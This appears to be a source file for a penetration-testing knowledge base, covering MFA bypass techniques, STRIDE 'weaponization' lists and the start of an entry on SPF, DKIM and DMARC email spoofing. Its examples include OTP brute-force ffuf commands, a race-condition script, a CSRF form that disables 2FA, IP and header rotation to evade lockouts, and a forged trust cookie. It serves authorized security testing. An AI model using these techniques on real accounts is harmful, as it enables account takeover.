          'Then test the counter resets. Does a successful login from the same address reset the failure count? PortSwigger documents that exact implementation, and it means you can interleave your own valid login every N guesses and never trip the block. Does resending the code reset the count? HackTricks lists this as its own technique, and it is common: three wrong guesses, POST to the resend endpoint, three more, forever. Does the limit apply per login flow rather than per account, so abandoning the flow and starting a fresh one restores the budget? Is there a limit on the login endpoint but none on the internal action endpoint that the same code protects?',
          'Test whether the throttle is even server side. If the button greys out and a countdown appears, replay the raw request with curl and see whether the server independently refuses it.',
          'Now the trap that makes people miss real findings: keep going after the block appears. A documented ATO writeup describes an endpoint that returned 401 for every guess after twenty failures but still returned 200 for the correct one, so the rate limit blocked nothing and only looked like it did. Run the whole range and sort by status, response length, and timing rather than stopping when the responses look uniform.',
          'When the app does enforce a real per account lockout with a logout, automate around it rather than giving up. The PortSwigger 2FA brute force lab is the reference implementation: a Burp session handling rule runs a macro of GET /login, POST /login, GET /login2 before each attempt so the flow is re-established after every forced logout, Intruder is set to Numbers payloads across the code space with the integer digits fixed so codes are zero padded, and the resource pool is capped at one concurrent request so the sequence stays coherent. The point is that "we log the user out after two wrong codes" is not a defence at all once the login is scriptable.',
          'Finally, try to collapse the search space instead of covering it. If resending mints a new code while every previously issued code stays valid, then after fifty resends there are fifty live codes and each guess is fifty times more likely to hit. And test whether the code field accepts an array: the PortSwigger multiple credentials per request flaw applies directly, since hundreds of candidate codes inside one request increment the counter once.',
          'The clearest public example of the whole class is the Meta Accounts Center bypass reported by Gtm Manoz, paid 27,200 USD, reported in 2022 and written up publicly in January 2023. The brute forced code was not the login OTP; it was the SMS code that confirms a phone number, on a surface with no attempt limit at all. Confirming the victim phone number on the attacker account removed it from the victim account and revoked their 2FA. That is why the route inventory in the mapping step matters: the weakest OTP surface in the product sets the security level of every other one.',
        ],
        examples: [
          { code: "ffuf -u https://target/api/v1/mfa/verify -X POST -H 'Content-Type: application/json' -H 'Cookie: session=PRE_MFA' -d '{\"code\":\"FUZZ\"}' -w <(seq -w 000000 999999) -mc all -t 10", note: 'Full six digit space. Use -mc all and filter afterwards so you can see the differential rather than a preselected success code.' },
          { code: 'Burp Intruder: payload type Numbers, 0 to 9999 step 1, Min and Max integer digits 4; resource pool max concurrent requests 1', note: 'Zero padded four digit codes, sent strictly in sequence.' },
          { code: 'Burp session handling rule -> scope all URLs -> run macro [GET /login, POST /login, GET /login2] before each request', note: 'Re-authenticates after the forced logout, which is what makes an attempts-then-logout defence useless.' },
          { code: 'Rotate per request:  X-Forwarded-For, X-Real-IP, X-Client-IP, X-Originating-IP, True-Client-IP, CF-Connecting-IP', note: 'If the counter moves when you change one of these, the lockout keys on a value the attacker supplies.' },
          { code: 'Rotate the real source: FireProx or OmniProx cloud egress, or an IPv6 /64 from a provider that issues one.', note: 'Defeats a genuine per source IP limit. An IPv6 /64 is 2^64 addresses.' },
          { code: 'Counter reset probes:  N wrong -> POST /mfa/resend -> N wrong    |    N wrong -> log in successfully -> N wrong    |    N wrong -> abandon flow, restart login', note: 'Three separate reset bugs. Test each; they are implemented independently.' },
          { code: '{"username":"victim","mfa-code":["000000","000001","000002","000003"]}', note: 'Multiple candidates in one request: many guesses, one counter increment. Works wherever the field is deserialized loosely.' },
          { code: 'After the block appears, keep going and sort the results by status, length, and response time.', note: 'A documented ATO had 401 for every wrong code post-block and 200 for the right one. Closing Intruder early loses the finding.' },
        ],
      },
      {
        heading: 'Variant 6: racing the code',
        body: [
          'Single use is enforced by a check and then a write. If those are not atomic, several requests carrying the same code all read the unconsumed state and all succeed. This matters most for recovery codes, where each code is meant to be destroyed on use: redeeming one code twice quietly doubles the recovery material and can leave the attacker with a live session after the legitimate owner has consumed the code themselves.',
          'The same non atomicity applies to the attempt counter. Fire the twentieth and twenty first guesses in the same packet and the limit may never increment between them, which lets you fit more guesses under a limit that is otherwise correctly implemented.',
          'A third race is about the pool of live codes rather than one code: fire several resend requests simultaneously and check whether they mint several codes that are all valid at once, or whether the last one wins. Several valid codes at once multiplies your odds per guess and is the mechanism that makes an otherwise adequate limit inadequate.',
          'The synchronization technique itself is covered in the Race Condition entry; use the single packet attack over HTTP/2 so the batch lands within a millisecond, and remember that server side processing variance means twenty to thirty requests is a more reliable batch than two.',
        ],
        examples: [
          { code: "Turbo Intruder:\ndef queueRequests(target, wordlists):\n    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, engine=Engine.BURP2)\n    for i in range(30):\n        engine.queue(target.req, gate='race1')\n    engine.openGate('race1')\n\ndef handleResponse(req, interesting):\n    table.add(req)", note: 'Single packet attack over HTTP/2. Queue the same recovery code 30 times; two or more successes means consumption is not atomic.' },
          { code: 'Burp Repeater: add the requests to a tab group and use Send group in parallel.', note: 'The single packet attack without writing Python, good enough for a first pass.' },
          { code: 'Race the counter: send guess 20 and guess 21 in the same packet.', note: 'Fits extra attempts under a limit whose read and increment are not atomic.' },
          { code: 'Race the resend: fire 5 concurrent POST /mfa/resend, then try the first code you received.', note: 'If several codes stay valid at once, the effective keyspace per guess shrinks by that factor.' },
        ],
      },
      {
        heading: 'Variant 7: backup codes, recovery, and factor downgrade',
        body: [
          'Recovery paths exist so users are not locked out, which means they are designed to be easier than the primary factor. They are therefore the natural place for the bug, and they are consistently under tested because the primary OTP field looks hardened.',
          'Test the recovery field as a separate endpoint with its own everything: its own rate limit (frequently absent where the OTP field has one), its own single use enforcement, its own account binding. Check the format first, because it decides whether brute force is even relevant. Eight alphanumeric characters is far too large a space to attack, but plenty of implementations issue six or eight digits, which is one million to one hundred million and squarely feasible without a limit. Check whether used codes are actually invalidated, and whether regeneration is predictable.',
          'Then look at how the codes are stored and retrieved. HackTricks flags that backup codes are typically generated the instant 2FA is enabled and can often be fetched later by an endpoint that requires only a session and no re-authentication. If that endpoint exists, cross site scripting anywhere in the origin, or a permissive CORS policy that reflects arbitrary origins with credentials, reads the entire recovery set in one request. That is a genuine chain: read the CORS Misconfiguration and XSS entries for the delivery half.',
          'Finally, test downgrade. If the account has a phishing resistant factor such as a WebAuthn security key, and the challenge page offers "try another way" leading to SMS, email, or a backup code, the security key is not the account security level, the weakest offered alternative is. The correct behaviour is that switching or removing a factor requires re-authentication with an existing enrolled factor, which is what the OWASP Multifactor Authentication cheat sheet requires.',
          'SIM swapping and SMS interception are real and are how SMS factors actually fall in the wild, but they are not application tests and are almost always out of scope. What is in scope is whether the application lets you move to the SMS factor, or change the number attached to it, without re-proving the stronger factor first.',
        ],
        examples: [
          { code: "ffuf -u https://target/api/v1/mfa/recovery -X POST -H 'Content-Type: application/json' -H 'Cookie: session=PRE_MFA' -d '{\"recovery_code\":\"FUZZ\"}' -w codes.txt -mc all", note: 'The recovery field has its own limit, or does not. Test it independently of the OTP field.' },
          { code: "curl -si -b 'session=FULL' https://target/settings/security/backup-codes", note: 'If this returns the codes with no re-authentication, XSS or a credentialed CORS misconfiguration reads them.' },
          { code: "curl -si -b 'session=FULL' -H 'Origin: https://attacker.example' https://target/api/v1/mfa/backup-codes  -> check Access-Control-Allow-Origin and Allow-Credentials", note: 'A reflected origin with credentials turns the backup code endpoint into a cross origin read.' },
          { code: 'On the challenge page, take every "try another way" branch and record which factors it reaches.', note: 'Enumerates the downgrade surface; the weakest reachable factor is the real security level.' },
          { code: 'Attempt to change the registered phone number or add a new factor from a session that has not answered a challenge.', note: 'Factor changes must require re-authentication with an already enrolled factor.' },
        ],
      },
      {
        heading: 'Variant 8: routes that never see the MFA policy',
        body: [
          'This is where the biggest bounties in this class come from, because the bypass needs no guessing and no tampering: you just walk through a different door. Every item from the route inventory built during mapping gets tested independently.',
          'Federated and social login first. A disclosed HackerOne report against Cloudflare (report 1593404) is the archetype: an account with Cloudflare 2FA configured could be logged into through the Sign in with Apple flow, which did not enforce the same requirement. TikTok fixed a 2FA bypass in its login flow, a rapid retry weakness on the Two-Step Verification endpoint (report 1747978). Test each provider button separately; they are usually distinct handlers written at different times, and the question is whether the relying party checks its own local MFA policy after the federated identity resolves, or treats a successful federation as sufficient on its own.',
          'Password reset next, and it is two separate tests. Does completing a reset drop you into a fully authenticated session without a challenge? And does the reset flow disable or clear the second factor, which some implementations do deliberately to avoid lockouts? Also check whether the reset link is single use, since HackTricks notes that repeated resets with the same link can produce a login that never passes the challenge. The same applies to the email verification link sent at registration and to any magic link: HackTricks cites a case where the account creation verification link granted profile access with no 2FA.',
          'Then old code. Older API versions visible as /v1/ or /api/legacy/ paths, staging or legacy subdomains, and mobile or desktop client endpoints all tend to predate the MFA rollout. Read the JavaScript bundle for version strings and hardcoded hosts, and check archived URL sources for paths the current app no longer links.',
          'Non HTTP protocols are the same pattern at the infrastructure level. Basic authentication over IMAP, POP, EWS, MAPI, and ActiveSync famously bypassed conditional access MFA in Microsoft 365, but be accurate about the timeline rather than repeating a stale playbook: Microsoft began permanently disabling Basic Auth for those Exchange Online protocols on 1 October 2022 and it can no longer be re-enabled, with SMTP AUTH carved out at the time and retired separately afterwards. Do not present that instance as a current finding. The pattern itself is very much alive in self hosted mail, VPN portals, RDP gateways, and any product that kept a legacy authentication endpoint for compatibility.',
          'Last, the tokens that exist to skip authentication by design. Personal access tokens, API keys, app passwords, and service credentials usually authenticate with no second factor. The question is whether one can be minted from a session that never answered a challenge, because that converts a temporary bypass into permanent access that survives the password being changed.',
        ],
        examples: [
          { code: 'Enable 2FA on your test account, then log in through each social or SSO button in turn and record which ones challenge you.', note: 'The Cloudflare Apple ID case. Enforcement is per handler, so one unchecked provider is the whole bypass.' },
          { code: 'Complete a password reset, then check the resulting session and whether the 2FA setting survived.', note: 'Two defects: a full session with no challenge, and a reset that silently disables the factor.' },
          { code: 'Reuse a password reset link a second and third time.', note: 'A reset link that is not single use gives repeatable challenge-free logins.' },
          { code: "curl -si -b 'session=PRE_MFA' https://target/api/v1/me   vs   https://target/api/v3/me", note: 'Old API versions predate the policy. Same test on old.target, m.target, staging hosts.' },
          { code: "curl -si -b 'session=PRE_MFA' -X POST https://target/api/v1/tokens -d '{\"name\":\"x\",\"scopes\":[\"*\"]}'", note: 'A personal access token minted from a half authenticated session is permanent, factor-free access.' },
        ],
      },
      {
        heading: 'Variant 9: trusted device and remember me',
        body: [
          'Remember this device converts the second factor into a bearer token stored in a cookie. Get that cookie right and you skip the challenge; get it wrong and you have handed out a permanent MFA exemption.',
          'Start by decoding your own. Base64, hex, and JWT are the usual encodings. PortSwigger documents the pattern where a persistent login cookie is a predictable concatenation of static values, in the worst cases the base64 of the username joined to an unsalted hash of the password, which you can recompute for any user whose password hash you can guess or crack. If the value contains a user identifier, an email, or a sequence, try constructing the victim variant directly. HackTricks lists predictable remember me values as its own bypass for exactly this reason.',
          'Then test what the cookie is bound to, which is a different question from whether it is guessable. Present it from a different IP, a different User-Agent, and a different browser profile. Then present it inside a session logged in as a different account: if the challenge is skipped for account B while carrying account A device token, the token is not bound to a user at all and is a universal exemption. Check whether it survives a password change, a factor re-enrolment, and an explicit "sign out all devices", because a trust token that outlives revocation defeats the victim response to a compromise.',
          'If the trust decision consults the client address, that address is often taken from a forwarding header. HackTricks lists X-Forwarded-For impersonation as a remember-me bypass specifically: where the server treats the header value as the client identity, supplying the victim last seen address makes their device look like yours.',
          'Also check the enrolment side. Can the device be marked trusted from a session that has not completed a challenge? That is the full loop: bypass once, mark trusted, and never be challenged again.',
        ],
        examples: [
          { code: "Cookie: remember_device=YWRtaW46NWY0ZGNjM2I1YWE3NjVkNjFkODMyN2RlYjg4MmNmOTk=", note: 'base64 of username:md5(password). Decode yours, recompute for the victim, and the challenge is skipped.' },
          { code: "Common names to look for: remember_device, trust_token, device_id, dt, sso_device, 2fa_remember, __Host-trust", note: 'Anything that persists past logout and correlates with skipping the challenge.' },
          { code: 'Present the trust cookie from a new IP, a new User-Agent, and then inside a session authenticated as a different account.', note: 'If the challenge is skipped for a different account, the token is not bound to a user.' },
          { code: 'X-Forwarded-For: <victim last known address>', note: 'Only relevant where the trust or lockout decision reads the client address from a header rather than the socket.' },
          { code: 'Change the password, then retry the trust cookie. Click sign out all devices, then retry it.', note: 'A trust token that survives revocation defeats the victim response to a known compromise.' },
        ],
      },
      {
        heading: 'Variant 10: attacking the MFA settings themselves',
        body: [
          'Instead of passing the challenge, remove it or become it. This half of the class targets the security settings surface, and it is usually far less hardened than the login.',
          'Cross site request forgery on the disable endpoint is the classic. Check whether POST to the 2FA disable route carries an anti CSRF token, whether that token is actually validated when removed or replaced with another user token, and what the session cookie SameSite value is. Be precise here rather than optimistic: an explicit SameSite=Lax cookie is not sent on a cross site top level POST, so the practical Lax openings are a state changing endpoint that also accepts GET, a cookie with no SameSite attribute at all during the browser two minute grace window after it is set, and SameSite=None. Read the CSRF entry for the delivery mechanics and the SameSite nuances. Clickjacking is the same objective with a different delivery: if the security settings page sets neither X-Frame-Options nor a frame-ancestors directive, frame it transparently and get the victim to click the disable toggle.',
          'Missing step up authentication is the broader defect underneath. The OWASP Multifactor Authentication cheat sheet requires re-authentication before changing a password or security question, changing the account email, disabling MFA, changing or replacing MFA factors, and elevating to administrative privileges. Walk that list against the target and note every action that a plain session cookie performs. The related case worth testing alongside it is a password change that does not require the current password, which turns any temporary session access into permanent takeover.',
          'Enrolment is the inverse attack and is often the most durable. If you hold a stolen session or a half authenticated one, can you register your own authenticator, phone number, or security key on the victim account? If enrolment does not require re-authentication with an existing factor, you become the account second factor, and your access survives the victim changing their password.',
          'Two more checks that are quick and frequently fail. When the victim enables 2FA, are sessions created before that moment terminated? HackTricks calls this out explicitly, and if they are not, an already stolen session simply outlives the mitigation the victim just applied. And does the application send an out of band notification when a factor is added, removed, or changed? Silence there is what makes the enrolment attack invisible.',
          'While you are on the challenge page, note what it discloses. A partially masked phone number or email confirms the account exists, confirms which factor is enrolled, and narrows a social engineering or SIM swap attempt, all to someone who only supplied a username.',
        ],
        examples: [
          { code: "<html><body onload=\"document.f.submit()\"><form name=f method=POST action=\"https://target/settings/2fa/disable\"><input name=confirm value=1></form></body></html>", note: 'CSRF proof of concept. Serve it cross origin and confirm the factor is removed with no interaction beyond loading the page.' },
          { code: 'Replace the CSRF token with one issued to a different account, then with an empty value, then remove the parameter entirely.', note: 'Three separate validation failures: not bound to the session, not required when empty, not required when absent.' },
          { code: "curl -sI https://target/settings/security | grep -Ei 'x-frame-options|content-security-policy'", note: 'No X-Frame-Options and no frame-ancestors means the disable toggle can be framed and clickjacked.' },
          { code: "curl -si -b 'session=PRE_MFA' -X POST https://target/api/v1/mfa/enroll -d '{\"type\":\"totp\"}'", note: 'Enrolling your own factor from a half authenticated session makes you the account second factor permanently.' },
          { code: 'Step up checklist: disable MFA, change password, change email, change phone, add a factor, add an org admin, change payout details.', note: 'Every one of these should demand a fresh factor or the current password. Note each that does not.' },
          { code: 'Log in on device A, enable 2FA on device B, then continue using device A.', note: 'Sessions predating activation must be revoked; if they are not, the mitigation does nothing against an already stolen session.' },
        ],
      },
      {
        heading: 'Tools, workflow, and reporting',
        body: [
          'Burp does most of this. Session handling rules with a login macro keep a long brute force alive through forced logouts, resource pools cap concurrency where sequence matters, Match and Replace automates the response manipulation tests, tab groups with Send group in parallel give you the single packet attack without writing code, and Turbo Intruder handles both the tight races and high rate guessing. ffuf covers the plain enumeration case well and is easier to script into a repeatable check. FireProx and OmniProx rotate the source address across cloud egress points, an IPv6 /64 from a provider gives effectively unlimited addresses, and curl-impersonate defeats JA3 based client fingerprinting where the block survives IP rotation.',
          'Work in a fixed order, because these tests interfere with each other. Map the flow and build the route inventory. Test forced browsing with the pre-authentication cookie, since it is free and ends the engagement if it works. Test the bindings on the code (account, session, purpose, single use, expiry) before touching rate limits, because every failed guess pollutes the counters you are about to measure. Test rate limits deliberately, one defence at a time. Then recovery codes, then alternate routes, then trusted devices, then the settings surface.',
          'Use two accounts you own for anything involving guessing. Brute forcing a real user code locks that person out of their own account, and every SMS resend costs the program money, which is exactly the kind of testing that gets a researcher removed from a programme. HackTricks notes that excessive SMS resends cost the company money without bypassing anything, so there is no upside to doing it against a stranger.',
          'For the report, capture the exact request that succeeded, the session it was made in, and unambiguous evidence that no second factor was ever presented in that session: the full request sequence from password submission to the authenticated action, with the step two request either absent or answered with a wrong code. Then state the chain honestly. "MFA bypass given a known password" is the accurate claim, and pairing it with a working credential source, a password reset flaw, or a session leak is what determines the severity.',
        ],
        examples: [
          { code: 'Burp: Settings > Sessions > Session Handling Rules > Add > Rule Actions > Run a macro; scope to all URLs.', note: 'The single setting that makes an attempts-then-logout defence irrelevant.' },
          { code: 'Burp: Settings > Sessions > Resource Pools > Maximum concurrent requests = 1', note: 'Keeps a multi step flow coherent while Intruder runs.' },
          { code: 'Turbo Intruder: Engine.BURP2 with gate and openGate for races; Engine.THREADED for volume when HTTP/2 is unavailable.', note: 'Two different jobs: sub-millisecond synchronization versus raw request rate.' },
          { code: 'FireProx / OmniProx for per request source rotation; curl-impersonate when JA3 fingerprinting blocks the proxy.', note: 'Only needed once you have shown the limit is genuinely per source address.' },
          { code: 'Evidence set: POST /login (yours), the absent or failed POST /login2, then the authenticated request and its response.', note: 'Shows the full session lifecycle and proves the factor was never presented.' },
        ],
      },
    ],
    stride: {
      spoofing: {
        weaponization: [
          'Force browse to authenticated pages and APIs with the pre-authentication session issued after the password, so the server treats a half finished login as the victim full session.',
          'Use a session the application already made fully authenticated at step one, where the challenge page is presentational and every endpoint was open the whole time.',
          'Brute force a four or six digit code against an account whose password you already hold, completing the login as that user because the attempt limit is missing, resettable, per source IP, or client side only.',
          'Submit a code generated on your own account into a login flow opened for the victim, where the code was never bound to the account being authenticated.',
          'Rewrite the account selector on the verification request (a verify parameter, an account cookie, a userId in the body) so the application mints and checks the code against whichever identity you name.',
          'Replay a code that is never invalidated after use or never expires, so one observed SMS, screenshot, or shoulder surf authenticates as that user indefinitely.',
          'Submit a code issued for a different purpose, such as phone number confirmation or a transaction approval, at the login challenge, borrowing the weakest OTP surface in the product.',
          'Read the code straight out of the challenge response body, a Set-Cookie value, a debug field, or the resend endpoint response, then submit it.',
          'Reproduce a predictable code derived from a timestamp, a sequence, or the user identifier rather than a cryptographically random secret.',
          'Flip a client trusted verdict (a success or mfaRequired field, or a 401 rewritten to 200) so the front end proceeds to mint or unlock a session for the account named in the flow.',
          'Transplant a completed MFA flag, cookie, or completion token from your own session into a session opened against the victim account.',
          'Race a single use OTP or recovery code so it redeems more than once, leaving you with a live session for an identity whose code the legitimate owner also consumed.',
          'Burn a backup or recovery code on a field with weaker or absent limits, or read the whole recovery set from an endpoint that needs only a session and is reachable through XSS or a credentialed CORS misconfiguration.',
          'Take a "try another way" downgrade from a phishing resistant security key to SMS, email, or a backup code, so the strong factor is never presented.',
          'Forge or replay a trusted device cookie that encodes only a username, a user id, or an unsalted hash of the password, so the server skips the challenge for that user from any machine.',
          'Spoof the victim source address with a forwarding header where the device trust or lockout decision reads the client IP from the header rather than the socket.',
          'Enter through a login route that never consults the local MFA policy: a social or SSO callback, an older API version, a legacy subdomain, a mobile client endpoint, or a legacy protocol that predates the policy.',
          'Complete a password reset, an email verification link, or a magic link that mints a fully authenticated session with no challenge, or that clears the second factor as a side effect.',
          'Mint a personal access token or API key from a half authenticated session, producing permanent identity that needs no factor and survives a password change.',
          'Enrol your own authenticator, phone number, or security key on the victim account from a stolen or half authenticated session, becoming the account second factor from that point on.',
          'Ride a session that predates the victim enabling 2FA, because activation did not terminate existing sessions.',
        ],
        why: 'The second factor is the only remaining proof that the party holding the password is the account owner, so any path that reaches the fully authenticated state without a code that is provably bound to that account, that session, and that moment leaves the application asserting an identity nothing verified.',
      },
      elevation_of_privilege: {
        weaponization: [
          'Reach an administrator or operator account whose password is known or guessable but which relied on the second factor as its last control.',
          'Perform actions gated by step up re-authentication (disabling MFA, changing the recovery email or phone, adding an organisation admin, changing payout details) from an ordinary session that never presented a fresh factor.',
          'Bypass an organisational policy that requires the acting user to have MFA enabled, by flipping the client side compliance flag, and then perform the privileged action it gated.',
          'Use a legacy route, older API version, or legacy protocol that issues a full privilege session or API ticket while the modern route would have demanded the second factor.',
          'Convert a temporary bypass into durable privileged access by minting an API key or personal access token, or by enrolling your own factor, from the bypassed session.',
        ],
        why: 'MFA is normally the last control between knowledge of a password and the privileged operations an account can perform, so defeating it promotes credential knowledge straight into the account full authority, including every action whose only additional guard was a step up challenge.',
      },
      tampering: {
        weaponization: [
          'Rewrite the account selector carried on the verification request so the server record of which account is being verified is set by the attacker.',
          'Modify response fields the client branches on, changing the authentication decision the browser then acts upon.',
          'Enrol, replace, or remove the victim registered factors, so the account own authentication configuration is attacker controlled.',
          'Confirm the victim contact detail (phone number or email) on an attacker owned account so it is detached from the victim account and their second factor is revoked, the mechanism in the Meta Accounts Center case.',
          'Disable the second factor through CSRF or clickjacking on the disable endpoint, changing the victim security settings with no action on their part.',
          'Race a single use code so the consumed marker is written once for several redemptions, leaving the code ledger inconsistent with what was actually spent.',
        ],
        why: 'Several of these bypasses do not merely read past the gate, they write to the authentication state the gate consults next time (which account is under verification, which factors are registered, whose contact details they point at, whether MFA is enabled at all), so a single successful request permanently changes what the control will decide.',
      },
      information_disclosure: {
        weaponization: [
          'Harvest the partially masked phone number or email shown on the challenge page, which confirms the account exists, reveals which factor is enrolled, and narrows a social engineering or SIM swap attempt, all from a username alone.',
          'Read the one time code itself where it is echoed in the challenge response body, a Set-Cookie value, a debug or error field, or the resend endpoint response.',
          'Read the full backup and recovery code set from an endpoint that requires only a session, reached through cross site scripting in the origin or a CORS policy that reflects arbitrary origins with credentials.',
          'Enumerate valid accounts and enrolled factors from response differences on the challenge and resend endpoints, which are reachable before authentication completes.',
          'Recover the construction of a persistent trust cookie by decoding your own, exposing the username and password hash of whoever else holds one.',
        ],
        why: 'The challenge surface is an unauthenticated or half authenticated endpoint that necessarily returns account specific state, so whatever it echoes back, contact details, the code, response timing and length differences, or the format of a persistent token, is disclosed to anyone who can supply a username.',
      },
      denial_of_service: {
        weaponization: [
          'Deliberately exhaust a victim attempt budget so the account lockout the application applies as a defence locks the real owner out.',
          'Consume or invalidate a victim single use recovery codes by racing or spending them, removing the path they would use to regain access.',
          'Trigger repeated SMS or voice code delivery to run up carrier cost and hit provider throttles, so legitimate codes stop being delivered.',
        ],
        why: 'The controls wrapped around the second factor are themselves per account resources (an attempt budget, a finite recovery code set, an SMS quota), so an attacker who can address them with nothing but a username can spend them all and turn the account defence into the mechanism that denies its owner access.',
      },
      repudiation: {
        weaponization: [
          'Force browse past the challenge so the session is recorded as MFA satisfied, stamping the audit trail with a factor that was never presented and making the attacker activity indistinguishable from the owner.',
          'Enter through a legacy route or non HTTP protocol that predates the policy and often sits outside the same authentication event stream, so the login never appears in the MFA or device history at all.',
          'Forge or replay a trusted device token so activity is attributed to a device the owner never registered and cannot recognise or disown in their device list.',
          'Enrol a new factor where the application sends no out of band notification, so no record exists of when control of the account actually changed hands.',
        ],
        why: 'Authentication logs and device lists record the outcome the state machine reached rather than the evidence that was presented, so a bypass that arrives at the authenticated state by another path is written down as a legitimate verified login and leaves the owner nothing to point at.',
      },
    },
  },

  {
    id: 'email-spoofing',
    name: 'Email Spoofing and Mail Header Injection',
    summary: 'Make mail appear to come from the target domain by defeating SPF, DKIM, and DMARC alignment, or by injecting into and abusing the mail the target application sends itself.',
    tags: ['email', 'spoofing', 'crlf'],
    executionContext: {
      where: "In the receiving mail server's authentication check and then in the recipient's mail client, not on the target's servers; the injection half executes in the sending application's SMTP conversation with its own MTA.",
      detail: "This attack has two halves that execute in completely different places, and confusing them is the most common mistake in reports. The domain half touches none of the target's code: the flaw lives in DNS TXT records the target publishes (SPF, DMARC, the DKIM selector), the evaluation happens inside whatever mail server receives the message (Google, Microsoft, a Proofpoint or Mimecast gateway), and the deception is finally rendered by the victim's mail client, which decides what to show for the From line. Nothing runs on the target. The application half does run on the target: an attacker controlled name, subject, or reply address is concatenated into the header block that the application's mail library hands to a local sendmail binary or writes into a live SMTP DATA stream, so the injected carriage return and line feed are interpreted by the MTA process on the application host, with the application's own mail credentials and the domain's own DKIM key. That is why an application side finding is usually much more severe: the forged message is not forged at all, it is genuinely sent and genuinely signed by the target. SMTP smuggling sits between the two, executing in the disagreement between an outbound relay and an inbound mail server about where the message data ends.",
    },
    howTo: [
      {
        heading: 'Root cause: three protocols, three different identities',
        body: [
          'A mail message carries at least two sender identities. The envelope sender, given in the SMTP MAIL FROM command, is what bounces go to and what the recipient never sees. The header From, defined in RFC 5322, is the address the mail client displays and the one a human acts on. The whole class of bugs here comes from the fact that the two authentication protocols do not check the identity the human reads.',
          "SPF (RFC 7208) authenticates the envelope MAIL FROM domain, and optionally the HELO name, by asking whether the connecting IP is listed in that domain's SPF record. RFC 7208 explicitly discourages using an SPF record to check any other identity, so an SPF pass says nothing at all about the visible From. DKIM (RFC 6376) authenticates a cryptographic signature over a chosen list of headers, binding the message to the signing domain in the d= tag, which again need not be the From domain. DMARC (RFC 7489) is the only one of the three that ties either result back to the visible From, through what it calls identifier alignment: a DMARC pass requires SPF or DKIM to pass and for the authenticated domain to align with the RFC5322.From domain.",
          'The consequence is the single most important fact to carry into testing: a domain with a perfect, strict SPF record ending in -all and a valid DKIM key is still trivially spoofable in the visible From if it publishes no DMARC record, because no receiver was ever asked to compare the two. Send from your own domain, which passes its own SPF, and set the From header to anything you like.',
          'Where this overlaps the Authentication Bypass entry it goes further: that entry covers getting into the application, this one covers forging the sender identity of mail and, in the parser discrepancy section below, converting a rerouted verification message into a genuinely held identity at the target domain. The CRLF primitive is the same one used in the Log Injection entry, but the sink is an SMTP header block rather than a log line, and the protocol desync idea is the same one in HTTP Request Smuggling, applied to the SMTP end of data marker.',
        ],
      },
      {
        heading: 'Pull the records first',
        body: [
          'Every assessment starts with four DNS lookups. SPF and DMARC are single TXT records at predictable names. DKIM is not enumerable from DNS alone, because you must know the selector: read it out of the s= tag of a real DKIM-Signature header on any message the target has sent you, such as a signup confirmation or a marketing mail, then query that selector.',
          'Also pull the MX records and any include: targets, because they tell you which third parties are authorized to send as the domain. A long include chain naming a dozen marketing platforms is both a lookup limit risk and a list of places where a compromised or self service account gives you an aligned sending path.',
        ],
        examples: [
          { code: 'dig +short TXT target.com | grep -i spf1', note: 'The SPF record. Absent means no envelope authorization is published at all.' },
          { code: 'dig +short TXT _dmarc.target.com', note: 'The DMARC record. No answer here is the finding that makes the visible From spoofable.' },
          { code: 'dig +short TXT _dmarc.mail.target.com', note: 'Subdomains can publish their own DMARC record that overrides the organizational one. Check the ones that actually send.' },
          { code: 'dig +short TXT selector1._domainkey.target.com', note: 'DKIM public key. selector1 and selector2 are the Microsoft 365 defaults; google is the Workspace default.' },
          { code: 'dig +short MX target.com   and   dig +short TXT _spf.vendor.example', note: 'Map the real mail path and walk each include: one level at a time.' },
        ],
      },
      {
        heading: 'Judge the SPF record',
        body: [
          "Read the rightmost all mechanism first, because it is the default answer for every IP not otherwise listed. RFC 7208 defines four qualifiers: + is pass, - is fail, ~ is softfail, and ? is neutral, and the qualifier defaults to + when omitted. A record ending in +all authorizes the entire internet to send as the domain and is a straight finding. A record ending in ?all is barely better. Most real records end in ~all, which asks receivers to accept but mark; on its own that is weak, but it becomes irrelevant once DMARC is enforcing, because a softfail is still not a pass and so still fails alignment.",
          'Count the DNS lookups. RFC 7208 section 4.6.4 requires implementations to limit the include, a, mx, ptr, and exists mechanisms and the redirect modifier to ten lookups in total, and to return permerror if that is exceeded. The ip4, ip6, and all mechanisms do not count. A record that has grown past ten through nested vendor includes therefore evaluates to permerror for every sender, which typically means neither a pass nor a fail and, under DMARC, no SPF-based alignment at all. Walk the chain yourself rather than trusting the top level record to look short.',
          'Then hunt for dangling references. Every include:, redirect=, a:, and mx: names a host or domain that must still exist and still belong to the target. If any of them resolves to a domain that has lapsed, or points at a subdomain whose CNAME target is an unclaimed service, whoever registers that name inherits the ability to publish an SPF record that authorizes their own servers as senders for the target. This is the same primitive as subdomain takeover, aimed at mail instead of HTTP, and it is not theoretical: the SubdoMailing campaign documented by Guardio Labs in 2024 used roughly 13,000 abandoned subdomains of brands including MSN, VMware, McAfee, and eBay to send authenticated spam at scale.',
          'Finally, note ptr: if you see it. It is deprecated by RFC 7208, is slow, and some receivers ignore it, so a record that relies on ptr for its authorization may not authorize anything in practice.',
        ],
        examples: [
          { code: 'v=spf1 include:_spf.google.com ~all', note: 'Typical and fine. Says nothing about the visible From on its own.' },
          { code: 'v=spf1 +all      v=spf1 ?all      v=spf1 a mx ptr ?all', note: 'Anyone can pass SPF for this domain. Report as an authorization failure, not just a hygiene note.' },
          { code: 'v=spf1 include:a.example include:b.example include:c.example ... -all', note: 'Expand every include recursively; more than ten lookups total makes the whole record permerror.' },
          { code: 'for d in $(dig +short TXT target.com | tr " " "\\n" | grep -oP "(?<=include:)\\S+"); do dig +short TXT $d; done', note: 'One level of include expansion. Repeat until the tree is flat, then count a/mx/include/exists/redirect.' },
          { code: 'dig +short A dead-vendor.example    (NXDOMAIN, but still in the SPF chain)', note: 'A dangling include. Register the name and you can authorize your own sending IPs for the target.' },
        ],
      },
      {
        heading: 'Judge the DMARC record, including the subdomain trap',
        body: [
          'DMARC is published as a TXT record at _dmarc.<domain> and is the record that decides whether the spoof lands. p=none asks receivers to take no action on failure, which means the policy exists only to collect reports and the domain is still spoofable in practice. p=quarantine asks for the message to be treated as suspicious, usually the spam folder. p=reject asks receivers to refuse it outright. Only quarantine and reject actually change delivery.',
          'Check pct=. A record with p=reject; pct=20 applies the reject disposition to a sample of messages and falls back to normal handling for the rest, so a determined sender simply retries. Check aspf= and adkim= too: the default is relaxed, where the authenticated domain and the From domain only need the same organizational domain, so any subdomain aligns; strict requires an exact match and is much harder to satisfy from a takeover of a sibling name.',
